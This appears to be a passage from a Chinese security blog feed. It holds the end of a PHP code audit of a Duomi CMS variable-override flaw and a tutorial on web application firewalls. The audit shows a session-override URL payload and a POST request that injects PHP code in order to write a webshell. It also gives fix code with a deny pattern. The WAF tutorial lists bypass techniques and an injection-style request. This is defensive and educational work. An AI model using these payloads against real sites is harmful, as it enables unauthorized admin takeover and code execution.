class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">checkUser</span>(<span class="params"><span class="variable">$username</span>,<span class="variable">$userpwd</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$dsql</span>;</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userName = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$username</span>);</span><br><span class="line">    <span class="variable language_">$this</span>-&gt;userPwd = <span class="title function_ invoke__">m_ereg_replace</span>(<span class="string">&quot;[^0-9a-zA-Z_@!\.-]&quot;</span>, <span class="string">&#x27;&#x27;</span>, <span class="variable">$userpwd</span>);</span><br><span class="line">    <span class="variable">$pwd</span> = <span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;userPwd),<span class="number">5</span>,<span class="number">20</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">SetQuery</span>(<span class="string">&quot;Select * From duomi_admin where name like &#x27;&quot;</span>.<span class="variable">$this</span>-&gt;userName.<span class="string">&quot;&#x27; and state=&#x27;1&#x27; limit 0,1&quot;</span>);</span><br><span class="line">    <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">Execute</span>();</span><br><span class="line">    <span class="variable">$row</span> = <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">GetObject</span>();</span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$row</span>-&gt;password))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span>(<span class="variable">$pwd</span>!=<span class="variable">$row</span>-&gt;password)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> -<span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="variable">$loginip</span> = <span class="title function_ invoke__">GetIP</span>();</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userID = <span class="variable">$row</span>-&gt;id;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;groupid = <span class="variable">$row</span>-&gt;groupid;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;userName = <span class="variable">$row</span>-&gt;name;</span><br><span class="line">        <span class="variable">$inquery</span> = <span class="string">&quot;update duomi_admin set loginip=&#x27;<span class="subst">$loginip</span>&#x27;,logintime=&#x27;&quot;</span>.<span class="title function_ invoke__">time</span>().<span class="string">&quot;&#x27; where id=&#x27;&quot;</span>.<span class="variable">$row</span>-&gt;id.<span class="string">&quot;&#x27;&quot;</span>;</span><br><span class="line">        <span class="variable">$dsql</span>-&gt;<span class="title function_ invoke__">ExecuteNoneQuery</span>(<span class="variable">$inquery</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我们直接使用正确admin账号密码登录后台，可以观察到admin用户对应的用户和所属组均为1。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-28.png"></p><p>那么现在我们只要利用变量覆盖漏洞，覆盖 <strong>session</strong> 的值，从而伪造 <strong>admin</strong> 身份，然后就可以愉快的写shell了。</p><h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>我们需要先找一些开启 <strong>session_start</strong> 函数的程序来辅助我们伪造身份，我们这里就选择 <strong>member&#x2F;share.php</strong> 文件。</p><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-29.png"></p><p>我们先访问如下 <strong>payload</strong> ：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="comment">//localhost/member/share.php?_SESSION[duomi_group_]=1&amp;_SESSION[duomi_admin_]=1</span></span><br></pre></td></tr></table></figure><p>当我们访问 <strong>payload</strong> 后，我们对应 <strong>session</strong> 的用户和所属组都变成了1。然后，我们再POST如下数据包写入webshell：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/admin/admin_ping.php?action=set</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>www.localhost.com</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.100 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>34</span><br><span class="line"></span><br><span class="line"><span class="language-abnf"><span class="attribute">weburl</span><span class="operator">=</span><span class="string">&quot;;phpinfo();//&amp;token=</span></span></span><br></pre></td></tr></table></figure><p><img src="/2024/10/15/WebSecurity/codeaudit/phpaudit4/image-30.png"></p><h3 id="修复建议"><a href="#修复建议" class="headerlink" title="修复建议"></a>修复建议</h3><p>实际上，这个漏洞和 <strong>Dedecms</strong> 变量覆盖漏洞很相似。而在 <strong>Dedecms</strong> 的官方修复代码中，多了检测变量名是否为PHP原有的超全局数组，如果是，则直接退出并告知变量不允许，具体修复代码如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">_RunMagicQuotes</span>(<span class="params">&amp;<span class="variable">$svar</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">get_magic_quotes_gpc</span>())</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$svar</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">foreach</span>(<span class="variable">$svar</span> <span class="keyword">as</span> <span class="variable">$s_k</span> =&gt; <span class="variable">$s_v</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="variable">$svar</span>[<span class="variable">$s_k</span>] = <span class="title function_ invoke__">_RunMagicQuotes</span>(<span class="variable">$s_v</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$svar</span>)&gt;<span class="number">0</span> &amp;&amp; <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;#^(cfg_|GLOBALS|_GET|_POST|_COOKIE|_SESSION)#&#x27;</span>, <span class="variable">$svar</span>))</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">exit</span>(<span class="string">&#x27;Request var not allow!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$svar</span> = <span class="title function_ invoke__">addslashes</span>(<span class="variable">$svar</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$svar</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Code Audit </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【Web安全】Web应用防火墙</title>
      <link href="/2024/10/15/WebSecurity/framwork/waf/"/>
      <url>/2024/10/15/WebSecurity/framwork/waf/</url>
      
        <content type="html"><![CDATA[<p>这篇文章写的很好：<a href="https://zhuanlan.zhihu.com/p/542011331">WAF入门扫盲篇（一遍就懂）</a><br><a href="https://habr.com/en/companies/dsec/articles/454592/">https://habr.com/en/companies/dsec/articles/454592/</a></p><h2 id="引言-介绍WAF"><a href="#引言-介绍WAF" class="headerlink" title="引言&amp;&amp;介绍WAF"></a>引言&amp;&amp;介绍WAF</h2><p>早就想整理有关waf相关的内容了，今天系统梳理下</p><h3 id="WAF的部署模式"><a href="#WAF的部署模式" class="headerlink" title="WAF的部署模式"></a>WAF的部署模式</h3><p>如果WAF像传统防火墙那样，放置在网络入口，那么，对于DDOS攻击来说，它是很容易沦陷的。所以WAF一般是部署在防火墙（特别是高防DDOS设备）后面，基本架构如下图<br><img src="/2024/10/15/WebSecurity/framwork/waf/image.png"><br>由于性能差异这么大，所以WAF和防火墙之间还会部署负载均衡设备。<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-1.png"></p><table><thead><tr><th>部署方式</th><th>工作原理</th><th>优点</th><th>缺点</th></tr></thead><tbody><tr><td>透明模式</td><td>工作模式为透明桥模式，检测、过滤或转发两者之间的会话，客户端直接访问Web服务器，感知不到WAF存在。</td><td>配置简单，不改变原有网络环境，通过硬件Bypass功能不影响网络原有业务通讯</td><td>Bypass功能启动后WAF自身功能失效，网络所有流量都经过WAF，对设备硬件性能要求高</td></tr><tr><td>路由代理模式</td><td>工作模式为路由转发模式，需要配置WAF的转发接口IP地址以及路由，其它和透明模式一样。</td><td>配置相对简单，不改变原有网络环境</td><td>存在单点故障问题，负责转发所有流量</td></tr><tr><td>反向代理模式</td><td>工作原理是将Web服务器的地址映射到反向代理服务器上，客户端实际访问的是WAF，由WAF来转发请求和响应。</td><td>能够支持负载均衡</td><td>配置较为复杂，需要改变原有网络环境</td></tr><tr><td>旁路模式</td><td>工作模式为旁听模式，将交换机端口上的HTTP流量镜像到WAF，WAF对HTTP流量进行监控和报警。</td><td>不改变原有网络环境，对原有网络不会有影响</td><td>只进行监控和报警，不进行阻断，达不到Web防护功能</td></tr></tbody></table><h3 id="WAF工作模式"><a href="#WAF工作模式" class="headerlink" title="WAF工作模式"></a>WAF工作模式</h3><p>关闭模式：可随时关闭，不影响整个业务<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-2.png"><br>WAF的监听模式是既过规则，也会直接传递给web服务<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-3.png"><br>WAF的防护模式是直接过规则，不会直接传递给web服务<br><img src="/2024/10/15/WebSecurity/framwork/waf/image-4.png"></p><h3 id="规则引擎原理"><a href="#规则引擎原理" class="headerlink" title="规则引擎原理"></a>规则引擎原理</h3><ol><li>请求部分<ul><li>网络层<ul><li>白名单：很多时候部署在WAF后面的应用，需要测试接口对非法输入的处理，但又不想关闭对该站点的监控，为了防止WAF对测试活动的影响，对来源IP和目标IP设置白名单，绕过WAF的拦截。从性能角度来考虑，白名单过滤功能是不可能放在其它过滤功能后面，那么它应该是规则引擎在网络层过滤的第一步。</li><li>黑名单：同样，对于已知有害的来源IP，是越早拦截越好，出于性能考虑，黑名单拦截功能应该在网络层，那么它应该紧跟在白名单后面。</li></ul></li><li>应用层<ul><li>https拆解：随着https越来越普及，WAF需要对https请求和响应进行检测和过滤，所以，WAF必须支持使用证书对https内容进行拆解。</li><li>http方法防护：不少http方法是有安全风险的，如果webserver的配置有问题，如果不在这一步拦截掉，而url白名单的来源IP又可能被攻击，那么就可以存在站点沦陷的风险。一般是拦截除了HEAD，GET，POST之外的方法</li><li>url白名单：由于某些接口（如请求某些静态资源）并不会存在漏洞，没必要对这些url进行规则过滤，或者防护站点某些url接口有所更新，需要特定的来源IP进行测试。应当存在url和来源IP对应的白名单</li><li>url黑名单：同样由于某些接口的实现可能会涉及大量运算，可能需要对该url访问进行次数限制，需要存在一个url和次数的黑名单。</li><li>http请求解码：http请求很多时候对头部和内容的数据往往会进行编码，如url编码，html编码，js编码，十六制编码，base64编码，主要是为了传输一些二进制数据，或攻击者用于绕过各种防护设备。只有对数据进行解码，才能够知道它真实的payload。所以需要对http请求进行解码。</li><li>http请求头部过规则：GET，HEAD方法的参数都是紧跟URL，这个阶段就可以进行过滤，而且先对请求头部过滤，也是基于性能考虑。毕竟请求url参数和头部都是key-value方式，解析相对比内容要快。</li><li>http请求内容过规则：POST方法的参数基本都是放在请求内容里。</li></ul></li></ul></li><li>响应部分<ul><li>响应头部过规则：响应头部有不少字段会泄露背后服务的关键信息，如server会泄露webserver软件及版本，x-powered-by会泄露cgi语言和版本（PHP，Python,Perl,Ruby之类），Via和Max-Forward会泄露WebServer的拓扑。为了避免攻击者利用这些信息攻击，需要对响应头部某些字段进行屏蔽或伪装。</li><li>响应内容过规则：这一部分也叫做软补丁功能。为什么呢？如果webserver的应用服务抛异常了，并把异常信息显示在页面，这是一种常见的信息泄露。如果需要研发团队来修改和测试，运维团队对该服务进行打补丁上线，整个过程可能持续几周，存在很大的风险窗口。如果在WAF上，对这些信息进行伪装或屏蔽，就可以极大降低安全风险。更加不用那些会泄露用户信息，金融信息等服务。</li></ul></li></ol><h3 id="WAF动作"><a href="#WAF动作" class="headerlink" title="WAF动作"></a>WAF动作</h3><p>WAF每条规则都会配置动作，对命中规则的请求进行对应的处理。每个WAF产品对动作定义不大一样。</p><ol><li>ModSecurity定义了allow, block, deny, drop, pass, pause, proxy, redirect<ul><li>allow: 命中了某条规则后，不需要对请求&#x2F;响应应用其它规则，直接让请求通过。这个可以用于白名单。</li><li>block: 并不是一个真正的动作，它的行为取决于配置的默认动作，如果默认动作更新，使用block的规则行为也随即改变。在安全响应方面，它可用于批量进行规则作为更新。</li><li>deny: 中断规则处理，拦截请求&#x2F;响应。在客户端的角度来说，这个动作会返回4xx或5xx的状态码（取决于规则定义status)，但并没有中断当前的连接</li><li>drop: 对当前tcp连接进行关闭操作，它和deny的不同是：deny之后，客户端仍然可以提交请求，但使用drop后，客户端只有重新连接才可以访问。这个动作可以节省后端服务的连接数</li><li>pass: 命中某条规则继续匹配下一条规则。可用于对请求进行精细地过滤，但会对响应速度有较大影响。</li><li>pause: 命中某条规则，对当前事务暂停指定的毫秒。一般用于防止登录爆破。如果遭受DDOS攻击，会恶化整个web服务的响应速度</li><li>proxy: 把命中规则的请求转发到另外一个web服务去。这个功能类似反向代理。由于它对客户端完全来说，完全是无感知，可以用它导向请求到蜜罐系统。这个动作是一个非常优秀的动作。</li><li>redirect: 当规则被命中，它会返回一个重定向，指示浏览器访问另外一个url。它和proxy的区别是，它对客户端是感知。可用于配置新上线接口或屏蔽某些有问题的接口。</li></ul></li><li>Naxsi定义了accept, block, drop<ul><li>accept: 对应ModSecurity的allow， 一旦命中立马放行</li><li>block: 对应ModSecurity的deny</li><li>drop: 对应ModSecurity的drop</li></ul></li><li>华为云WAF定义了allow, deny, redirect<ul><li>accept: 对应ModSecurity的allow， 一旦命中立马放行</li><li>deny: 对应ModSecurity的deny, 默认返回418</li><li>redirect: 对应Modsecurity的redirect</li></ul></li><li>openrestyl lua WAF定义了allow, deny，drop， redirect<ul><li>accept: 对应ModSecurity的allow， 一旦命中立马放行</li><li>deny: 对应ModSecurity的deny， 默认返回403</li><li>drop: 对应ModSecurity的drop</li><li>redirect: 对应Modsecurity的redirect</li></ul></li></ol><p>对于动作配置方面，有这样的建议：<br>在功能开发方面，drop最好能够先返回一个状态码再停止掉整个连接，drop, deny状态码尽量可以通过规则配置。<br>在配置规则时，对于drop, deny的状态码，每条规则或规则组都返回不同的状态码。<br>这样做的好处是：</p><p>有效隐藏WAF的特征，让攻击者无法确认是否有WAF存在<br>当出现规则误拦截时，可以根据返回码快速定位是哪条规则误拦截。这是从无数次背锅感悟出来的血的教训</p><h3 id="WAF规则与报表"><a href="#WAF规则与报表" class="headerlink" title="WAF规则与报表"></a>WAF规则与报表</h3><p>本上，WAF处理http分为四个阶段：请求头部，请求内容，响应头部，响应内容。那么WAF规则就是，定义在某个阶段WAF对符合某种条件的http请求执行指定动作的条例。根据这个，WAF规则必须要包含这些元素：过滤条件，阶段，动作。由于http消息在传输过程中会对数据进行某种编码，所以，WAF规则往往也需要定义解码器。同时为了审计作用，WAF规则往往定义id，是否对结果记录，以及字段抽取，命中规则的严重级别所以，一条WAF规则往往包含：id, 解码器，过滤条件，阶段，动作和日志格式，严重级别。</p><p>以一条ModSecurity规则为例：</p><blockquote><p>SecRule REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:&#x2F;* “\bsys.user_catalog\b” \ “phase:2,rev:’2.1.3’,capture,t:none,t:urlDecodeUni,t:htmlEntityDecode,t:lowercase,t:replaceComments,t:compressWhiteSpace,ctl:auditLogParts&#x3D;+E, \ block,msg:’Blind SQL Injection Attack’,id:’959517’,tag:’WEB_ATTACK&#x2F;SQL_INJECTION’,tag:’WASCTC&#x2F;WASC-19’,tag:’OWASP_TOP_10&#x2F;A1’,tag:’OWASP_AppSensor&#x2F;CIE1’, \ tag:’PCI&#x2F;6.5.2’,logdata:’%{TX.0}’,severity:’2’,setvar:’tx.msg&#x3D;%{rule.msg}’,setvar:tx.sql_injection_score&#x3D;+%{tx.critical_anomaly_score}, \ setvar:tx.anomaly_score&#x3D;+%{tx.critical_anomaly_score},setvar:tx.%{rule.id}-WEB_ATTACK&#x2F;SQL_INJECTION-%{matched_var_name}&#x3D;%{tx.0}”<br>看起来非常恐怖。翻译成XML就清晰多了</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">rule</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">id</span>&gt;</span>959517<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">description</span>&gt;</span><span class="tag">&lt;/<span class="name">description</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">severity</span>&gt;</span>2<span class="tag">&lt;/<span class="name">severity</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">phase</span>&gt;</span>2<span class="tag">&lt;/<span class="name">phase</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">decoder</span>&gt;</span>none, urlDecodeUni,htmlEntityDecode,lowercase,replaceComments,compressWhiteSpace<span class="tag">&lt;/<span class="name">decoder</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">condition</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">field</span>&gt;</span>REQUEST_FILENAME|ARGS_NAMES|ARGS|XML:/*<span class="tag">&lt;/<span class="name">field</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">operator</span>&gt;</span>regex<span class="tag">&lt;/<span class="name">operator</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">pattern</span>&gt;</span>\bsys\.user_catalog\b<span class="tag">&lt;/<span class="name">pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">condition</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">action</span>&gt;</span>block<span class="tag">&lt;/<span class="name">action</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">tags</span>&gt;</span><span class="tag">&lt;/<span class="name">tags</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">log</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">format</span>&gt;</span><span class="tag">&lt;/<span class="name">format</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">varibles</span>&gt;</span><span class="tag">&lt;/<span class="name">varibles</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">log</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">rule</span>&gt;</span></span><br></pre></td></tr></table></figure><p>规则陷阱：规则之间的关系非常复杂，特别过滤条件是使用正则表达式的，往往是会有包含关系，如[0-9]+包含了[1-2]+。那么，假设规则a先加入WAF，后面又新增了条规则b，在语法上，b的过滤条件包含了a，而且在配置上，不小心放在a前面，那么，就会出现误判的情况。<br>误判和漏判，是很常见的问题。但在严重程度上，却是不一样。</p><ul><li>漏判，可能会造成恶意请求绕过WAF，跑到业务后台，但在业务后台加上其它安全措施，却可以缓解威胁。</li><li>误判，则是直接在WAF把正常请求给拦截掉，影响正常的业务。曾经某大厂重要业务部门上WAF，由于误判，导致正常交易只有50%成功，几上几下之后，WAF团队的人基本干掉了。</li></ul><p>所以，在测试环境，<strong>WAF规则要越严格越好</strong>。但在生产环境，对有把握的规则才维持原样，其它规则尽量放宽松一些。<br>虽然WAF规则可以设置一个id用于追溯，这远远不够，因为无法追溯是由哪个消息触发，规则对消息处理的顺序是怎样。所以，一个稳妥的规则引擎，应当在http消息接收时，在头部增加一个消息id，当消息离开WAF前，删除掉这个消息id。通过这种方式，可以很好追溯到每条消息会触发哪些规则，触发结果是怎样。当出现误判情况下，也可以立马知道是哪些规则有问题，顺序是怎样，规则定义是否合理。</p><p>报表：<br>WAF报表除了是展示给用户看，还可以用于优化规则。如下面场景：</p><ul><li>某些规则一直没有命中，配置起来只会浪费计算资源，影响用户体现。</li><li>某些规则虽然有命中，但命中率较低，应该是放置在后面，而命中率高的则应该调整在前面。</li><li>某些URL访问频率较高，且并非标准浏览器访问，需要进一步观察和分析，看是否会有漏判风险</li></ul><p>那么，报表应该从哪些维度来展示呢？先从语义来描述一下http消息流经waf的过程：</p><ul><li>客户端A在物理地点B，使用IP地址C访问站点D，向URL地址E发起方法为F的HTTP请求G，命中了解码器为H，类型为I，风险级别为J，执行动作为K的规则L。</li><li>站点M向IP地址N返回响应O，命中了解码器为P，类型为Q，风险级别为R，执行动作为S的规则T。</li></ul><p>由语义来看，去重之后，报表的维度至少要包含：</p><ul><li>客户端（user_agent)分布</li><li>IP地址，甚至是IP段分布</li><li>物理地点分布</li><li>站点分布分布</li><li>URL分布</li><li>HTTP方法分布</li><li>请求分布（这个会比较困难，基于长度来看会比较好）</li><li>解码器分布</li><li>规则类型分布（一般是指针对的攻击类型）</li><li>风险级别分布</li><li>动作分布</li><li>规则ID分布</li><li>响应分布（和请求分布一样困难）</li><li>时间分布（任何事件只能在时间中进行）</li><li>总请求数</li><li>拦截数量</li></ul><h3 id="WAF检测原理"><a href="#WAF检测原理" class="headerlink" title="WAF检测原理"></a>WAF检测原理</h3><ol><li>基于规则匹配：一般都是基于一定的正则语法进行匹配，例如匹配函数 concat()，而不会匹配字符 concat。而 MySQL里面concat函数调用的时候括号是可以被隔开的。例如concat ()，就可以绕过该正则。</li><li>基于语义分析：将输入的参数模拟为真实语句去运行，然后判断结果是否有问题。这种理念类似于一个 webshell检测引擎，在不考虑性能等情况下，将PHP的Zend引擎下执行命令的函数hook住，如果该函数被调用，会先进入自己的逻辑去判断。如果符合恶意执行的逻辑则判断为webshell执行，从而实现webshell的识别。对于语义分析的WAF，绕过理念会更加复杂和困难。因为你不再是对正则进行绕过。而是类似于对一个解析引擎进行黑盒测试的绕过，将其绕过后还要保证后端的真实解析引擎不出错。类似于前面举例 concat的绕过，本质上是利用了前端语言引擎的解析和后端MySQL引擎解析的不一致达成绕过。而在基于语义分析绕过的情况下，再也无法使用等价替换的手段，只能通过WAF引擎与后端服务器引擎不一致来绕过。</li><li>RASP技术：例如OPENRASP有个功能是拦截所有 php&#x2F;jsp 等脚本文件的写入操作，从攻击会产生的行为去进行检测和防御，<a href="http://blog.nsfocus.net/rasp-tech/">http://blog.nsfocus.net/rasp-tech/</a></li></ol><h2 id="攻击（红对）视角下的WAF"><a href="#攻击（红对）视角下的WAF" class="headerlink" title="攻击（红对）视角下的WAF"></a>攻击（红对）视角下的WAF</h2><p>WAF的识别、检测、绕过原理与实战案例 <a href="https://www.freebuf.com/articles/web/336869.html">https://www.freebuf.com/articles/web/336869.html</a></p><h3 id="识别WAF"><a href="#识别WAF" class="headerlink" title="识别WAF"></a>识别WAF</h3><p>不同的waf有着不同的绕过策略，能够正确地识别waf很关键<br>一些开源项目：</p><ul><li>Awesome WAF 是一个 GitHub 上的开源项目，旨在为 Web 应用防火墙（WAF）领域提供一个全面的资源库。它汇集了大量的 WAF 相关信息：<a href="https://github.com/0xInfection/Awesome-WAF%EF%BC%8C%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9Ahttps://xz.aliyun.com/t/6422">https://github.com/0xInfection/Awesome-WAF，相关资料：https://xz.aliyun.com/t/6422</a></li><li>wafw00f：WAF指纹识别工具，<a href="https://github.com/EnableSecurity/wafw00f%EF%BC%8C%E7%9B%B8%E5%85%B3%E8%B5%84%E6%96%99%EF%BC%9Ahttps://www.freebuf.com/articles/web/384115.html">https://github.com/EnableSecurity/wafw00f，相关资料：https://www.freebuf.com/articles/web/384115.html</a></li></ul><p>除了这些指纹，还可以通过waf拦截页面来判断是什么waf：<a href="https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ">https://mp.weixin.qq.com/s/8F060FU9g_78z57UKS-JsQ</a></p><h3 id="WAF绕过手法"><a href="#WAF绕过手法" class="headerlink" title="WAF绕过手法"></a>WAF绕过手法</h3><p>干货 | 实战绕过WAF各种姿势总结：<a href="https://cloud.tencent.com/developer/article/1969001">https://cloud.tencent.com/developer/article/1969001</a><br>WAF机制及绕过方法总结：注入篇：<a href="https://www.freebuf.com/articles/web/229982.html">https://www.freebuf.com/articles/web/229982.html</a><br><a href="https://rivers.chaitin.cn/blog/cqj7vdp0lnedo7thq0a0">https://rivers.chaitin.cn/blog/cqj7vdp0lnedo7thq0a0</a><br><a href="https://xz.aliyun.com/t/15">https://xz.aliyun.com/t/15</a><br>从WAF的防范手段角度考虑，可以整理以下思路</p><ol><li>基于IP封锁<ul><li>基于http请求头封锁IP 可使用burp suite插件fake-ip进行绕过</li><li>基于TCP封锁IP 使用IP代理池不断切换真实IP</li><li>利用白名单，一些waf会设置一些白名单，比如针对360、百度等爬虫的白名单，可以通过设置特殊的请求头绕过</li></ul></li><li>基于规则问题<ul><li>常见规则类型：<ul><li>正则表达式规则：匹配特定的字符序列。</li><li>模版匹配规则：匹配预定义的攻击模板。</li><li>行为分析规则：分析请求行为，如请求频率、参数变化等。</li></ul></li><li>绕过方法：<ul><li>编码绕过： 利用URL编码、HTML编码、Unicode编码等方式对恶意payload进行编码，绕过正则匹配。</li><li>大小写绕过： 许多WAF对大小写敏感，通过大小写混合的方式绕过规则。</li><li>注释绕过： 在payload中插入注释，干扰WAF的检测。</li><li>特殊字符绕过： 利用特殊字符（如空格、换行符）绕过WAF。</li><li>时间差攻击： 针对基于时间差的检测机制，通过多次请求，逐渐增加payload长度，最终绕过WAF。</li></ul></li></ul></li><li>基于解析差异<ul><li>通过业务特性绕过  <figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/index.php?id=’an\d&#x27;&#x27;=&#x27;</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>localhost</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>*/*</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>en</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br></pre></td></tr></table></figure>  